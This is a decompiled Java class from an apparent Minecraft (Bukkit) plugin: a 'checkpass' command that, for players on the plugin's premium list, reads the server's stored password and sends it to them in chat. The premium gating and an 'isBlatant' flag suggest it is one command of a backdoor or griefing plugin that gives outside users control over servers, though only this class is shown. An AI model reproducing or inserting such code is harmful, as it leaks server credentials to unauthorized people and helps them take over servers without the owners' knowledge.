/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl.premium;

import me.qlutch.sucks.data.DataManager;
import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.entity.Player;

public class CheckpassCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.premium.contains(p2.getName())) {
            if (DataManager.getData().getBoolean("hasPass")) {
                p2.sendMessage(Settings.PREFIX("The password for this server is " + Settings.RED + DataManager.getData().getString("pass")));
            } else {
                p2.sendMessage(Settings.PREFIX("This server doesn't have a password set"));
            }
        } else {
            p2.sendMessage(Settings.PREFIX("You must be a premium " + Settings.RED + "user " + Settings.WHITE + "to execute this command"));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

